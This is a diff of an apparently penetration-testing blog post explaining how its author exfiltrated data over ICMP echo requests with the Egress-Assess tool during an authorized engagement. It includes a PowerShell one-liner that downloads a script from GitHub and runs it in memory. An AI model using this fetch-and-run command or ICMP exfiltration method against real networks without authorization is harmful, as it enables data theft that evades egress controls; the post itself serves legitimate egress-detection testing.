@@ -8,7 +8,8 @@ tags: [windows, ICMP, Data Extraction]
 I recently had a situation during an engagement where i needed to demonstrate that data could be extracted from the organisation. I wanted to exfil data without going over the internet for security as well as for ease of use duing the engagement and speed.
 The VPN when connected, and as expected, didn't allow local access as all routing went through the established tunnel first. However when the tunnel was disconnected the firewall would block all TCP and UDP access but would allow ICMP traffic to local subnets.
 This then led me to look into ICMP tunneling. I found various ways of gaining a reverse shell however data exfiltration was more tricky - this is where Egress Assess comes in.   
-From the Github Page here [https://github.com/FortyNorthSecurity/Egress-Assessere](https://github.com/FortyNorthSecurity/Egress-Assess) - "Egress-Assess is a tool used to test egress data detection capabilities."
+From the Github Page -> [https://github.com/FortyNorthSecurity/Egress-Assessere](https://github.com/FortyNorthSecurity/Egress-Assess)
+"Egress-Assess is a tool used to test egress data detection capabilities."
 
 Egress-Assess has many use cases for confirming if data can be extracted out of the network including HTTP, SMB, ICMP and more. It also has PowerShell and Python implementations for both server and client. This is good for us as its unliekly that we normally have PowerShell access on Windows based systems.
 Another great feature is that the client doesnt require local administrative privileges to run.
@@ -20,7 +21,7 @@ The setup uses a tradtional client / Server design. The server does require loca
 * Client (Win 10) - 192.168.1.239
 
 
-Againg from the Github Page, ICMP - The data is broken up into bytes and base64 encoded and sent over the wire in an ICMP Type 8 ECHO request. the data is placed inside the data field of the packet. The ECHO requests are continuously made to the EgressAsess Server which receives the ICMP request and gathers the data and decodes it.
+Again from the Github Page, ICMP - The data is broken up into bytes and base64 encoded and sent over the wire in an ICMP Type 8 ECHO request. the data is placed inside the data field of the packet. The ECHO requests are continuously made to the EgressAsess Server which receives the ICMP request and gathers the data and decodes it.
 
 To start firstly, confirm that you can send and receive ICMP echo requests and Responses bi-directionally.
 
@@ -48,12 +49,11 @@ If the server has started correctly you should see the following:
 ![img-description](/images/icmp-4.JPG)
 _ICMP Server Started & waiting for connections_
 
-Next you can either download the file onto the client, or run it in memeory directly.
+Next you can either download the file onto the client, or run it in memory directly.
 
 ```
-IEX (New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/ChrisTruncer/Egress-Assess/master/Invoke-EgressAssess.ps1‘)
+IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/FortyNorthSecurity/Egress-Assess/master/EgressAssess.ps1')
 ```
-
 
 Next, you have two main options. You either user the built-in audit tools that will create dummy data to mimic sensitive information such as Social Security Numbers / Credit Cards, OR you can specify specfic custom files.
 
